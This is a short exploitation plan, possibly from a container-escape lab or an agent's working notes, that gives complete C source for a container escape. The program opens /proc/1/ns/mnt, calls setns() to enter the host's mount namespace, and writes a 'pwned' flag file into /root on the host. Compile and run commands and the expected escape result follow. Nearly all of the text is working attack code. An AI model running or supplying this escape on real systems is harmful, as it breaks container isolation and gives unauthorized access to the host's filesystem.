## Step-by-Step Exploitation Plan

### Step 1: Confirm Ability to Switch to Host Mount Namespace Using `setns()`

Create C source file `escape.c`:

```c
#define _GNU_SOURCE
#include <sched.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main() {
    int fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (fd == -1) {
        perror("open /proc/1/ns/mnt");
        return 1;
    }
    if (setns(fd, 0) == -1) {
        perror("setns");
        close(fd);
        return 1;
    }
    close(fd);

    FILE *f = fopen("/root/pwned_by_alice.flag", "w");
    if (!f) {
        perror("fopen /root/pwned_by_alice.flag");
        return 1;
    }
    if (fprintf(f, "ESCAPED\n") < 0) {
        perror("fprintf");
        fclose(f);
        return 1;
    }
    fclose(f);
    return 0;
}
```

Compile:

```bash
gcc -o escape escape.c
```

Run:

```bash
./escape
```

**Expected result:**  
The file `/root/pwned_by_alice.flag` with content `ESCAPED` created on the actual host root filesystem, escaping the mount namespace bubble.

